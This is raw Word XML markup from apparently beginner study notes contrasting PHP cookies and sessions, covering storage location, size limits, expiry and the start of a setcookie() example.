            <w:highlight w:val="lightGray"/>
          </w:rPr>
          <w:t>Each session is given a unique identification id that is used to track the variables for a user.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="00DC33A6" w:rsidRDefault="00B61B1D" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="88"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:ins w:id="266" w:author="Unknown"/>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:highlight w:val="lightGray"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="267" w:author="Unknown">
        <w:r w:rsidRPr="00DC33A6">
          <w:rPr>
            <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
            <w:color w:val="242729"/>
            <w:sz w:val="23"/>
            <w:szCs w:val="23"/>
            <w:highlight w:val="lightGray"/>
          </w:rPr>
          <w:t>Both cookies and sessions must be started before any HTML tags have been sent to the browser.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w:rsidR="00B61B1D" w:rsidRPr="002415B3" w:rsidRDefault="00B61B1D" w:rsidP="00B61B1D">
      <w:pPr>
        <w:spacing w:before="60" w:after="100" w:afterAutospacing="1" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pP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DC33A6">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:highlight w:val="lightGray"/>
        </w:rPr>
        <w:t>A cookie is a bit of data stored by the browser and sent to the server with every request.</w:t>
      </w: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DC33A6">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:highlight w:val="lightGray"/>
        </w:rPr>
        <w:t>A session is a collection of data stored on the server and associated with a given user (usually via a cookie containing an id code)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005C42C7" w:rsidRPr="00F706D5" w:rsidRDefault="005C42C7" w:rsidP="005C42C7">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:highlight w:val="lightGray"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F706D5">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:highlight w:val="lightGray"/>
        </w:rPr>
        <w:t xml:space="preserve">Cookies are used to identify sessions. Visit any site that is using cookies and pull up either Chrome inspect element and then network or </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00F706D5">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:highlight w:val="lightGray"/>
        </w:rPr>
        <w:t>FireBug</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00F706D5">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:highlight w:val="lightGray"/>
        </w:rPr>
        <w:t xml:space="preserve"> if using Firefox.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005C42C7" w:rsidRPr="00F706D5" w:rsidRDefault="005C42C7" w:rsidP="005C42C7">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="240" w:line="240" w:lineRule="auto"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:highlight w:val="lightGray"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00F706D5">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:highlight w:val="lightGray"/>
        </w:rPr>
        <w:t>You can see that there is a header sent to a server and also received called Cookie. Usually it contains some personal information (like an ID) that can be used on the server to identify a session. These cookies stay on your computer and your browser takes care of sending them to only the domains that are identified with it.</w:t>
      </w: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F706D5">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:highlight w:val="lightGray"/>
        </w:rPr>
        <w:t>If there were no cookies then you would be sending a unique ID on every request via GET or POST. Cookies are like static id's that stay on your computer for some time.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005C42C7" w:rsidRPr="00405338" w:rsidRDefault="005C42C7" w:rsidP="005C42C7">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00405338">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">A session is a group of information on the server that is associated with the cookie information. If you're using PHP you can check the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00405338">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>session.save_path</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00405338">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t xml:space="preserve"> location and actually "see sessions". They are either files on the server </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00405338">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>filesystem</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00405338">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t xml:space="preserve"> or backed in a database.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00AB5160" w:rsidRPr="00405338" w:rsidRDefault="005C42C7" w:rsidP="00652DA1">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="180" w:after="180" w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00405338">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:noProof/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="486F6DD7" wp14:editId="75D59EF4">
            <wp:extent cx="5943600" cy="3036719"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="12" name="Picture 12" descr="Screenshot of a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a Cooki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36719"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="005C42C7" w:rsidRPr="00086692" w:rsidRDefault="005C42C7" w:rsidP="005C42C7">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="240" w:line="240" w:lineRule="auto"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00086692">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t xml:space="preserve">A session is a chunk of data maintained at the server that maintains state between HTTP requests. HTTP is fundamentally a stateless protocol; sessions are used to give it </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00086692">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>statefulness</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00086692">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:b/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005C42C7" w:rsidRPr="00405338" w:rsidRDefault="005C42C7" w:rsidP="005C42C7">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00405338">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>A cookie is a snippet of data sent to and returned from clients. Cookies are often used to facilitate</w:t>
      </w:r>
      <w:r w:rsidR="00430D3B">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00405338">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t xml:space="preserve">sessions since it tells the server which client handled which session. There are other ways to do this (query string magic </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00405338">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>etc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00405338">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>) but cookies are likely most common for this.</w:t>
      </w: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405338">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>The main difference between a session and a cookie is that session data is stored on the server, whereas cookies store data in the visitor’s browser.</w:t>
      </w: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405338">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>Sessions are more secure than cookies as it is stored in server.</w:t>
      </w:r>
      <w:r w:rsidR="00B157A1">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00405338">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>Cookie can be turn off from browser.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005C42C7" w:rsidRPr="00405338"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405338">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>Data stored in cookie can be stored for months or years depending on the life span of the cookie</w:t>
      </w:r>
      <w:r w:rsidR="009E6DCE">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00405338">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>.But the data in the session is lost when the web browser is closed.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CC2376" w:rsidRDefault="00CC2376" w:rsidP="005C42C7">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rPr>
      </w:pP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t>Cookies</w:t>
      </w:r>
      <w:r w:rsidR="00041C87">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005C42C7" w:rsidRPr="005C42C7" w:rsidRDefault="005C42C7" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="89"/>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Cookies are stored in browser as text file format.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005C42C7" w:rsidRPr="005C42C7" w:rsidRDefault="005C42C7" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="89"/>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It is stored limit amount of data. It is only allowing 4kb[4096bytes]</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005C42C7" w:rsidRPr="005C42C7" w:rsidRDefault="005C42C7" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="89"/>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It is not holding the multiple </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>variable</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t xml:space="preserve"> in cookies.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005C42C7" w:rsidRPr="005C42C7" w:rsidRDefault="005C42C7" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="89"/>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We can </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>accessing</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t xml:space="preserve"> the cookies values in easily. So it is less secure.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005C42C7" w:rsidRDefault="005C42C7" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="89"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="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The </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>setcookie</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
        <w:t>) function must appear BEFORE the tag.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B44BD0" w:rsidRDefault="00B44BD0" w:rsidP="00B44BD0">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="450"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00B44BD0" w:rsidRDefault="00B44BD0" w:rsidP="00B44BD0">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="450"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00B44BD0" w:rsidRDefault="00B44BD0" w:rsidP="00B44BD0">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="450"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="0046319B" w:rsidRDefault="0046319B" w:rsidP="005C42C7">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rPr>
      </w:pP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lastRenderedPageBreak/>
        <w:t>Destroy Cookies:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005C42C7" w:rsidRPr="005C42C7" w:rsidRDefault="005C42C7" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="90"/>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If we Closing the browsers at the time.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005C42C7" w:rsidRDefault="005C42C7" w:rsidP="00F97FFE">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="90"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="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Setting the cookie time to expire the cookie.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0005135B" w:rsidRPr="005C42C7" w:rsidRDefault="0005135B" w:rsidP="0005135B">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="450"/>
        <w:textAlignment w:val="baseline"/>
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Arial"/>
          <w:color w:val="242729"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
        </w:rPr>
      </w:pP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t>Example:</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gramStart"/>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Consolas"/>
          <w:color w:val="303336"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EFF0F1"/>
        </w:rPr>
        <w:t>&lt;?</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Consolas"/>
          <w:color w:val="303336"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EFF0F1"/>
        </w:rPr>
        <w:t>php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>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spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Consolas"/>
          <w:color w:val="303336"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EFF0F1"/>
        </w:rPr>
        <w:t>setcookie</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Consolas"/>
          <w:color w:val="303336"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EFF0F1"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Consolas"/>
          <w:color w:val="303336"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EFF0F1"/>
        </w:rPr>
        <w:t xml:space="preserve">name, value, expire, path, domain, secure, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Consolas"/>
          <w:color w:val="303336"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EFF0F1"/>
        </w:rPr>
        <w:t>httponly</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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303336"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EFF0F1"/>
        </w:rPr>
        <w:t>$</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Consolas"/>
          <w:color w:val="303336"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EFF0F1"/>
        </w:rPr>
        <w:t>cookie_uame</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
          <w:rFonts w:ascii="inherit" w:eastAsia="Times New Roman" w:hAnsi="inherit" w:cs="Consolas"/>
          <w:color w:val="303336"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="EFF0F1"/>
        </w:rPr>
        <w:t xml:space="preserve"> = </w:t>
      </w:r>
      <w:r w:rsidRPr="005C42C7">
        <w:rPr>
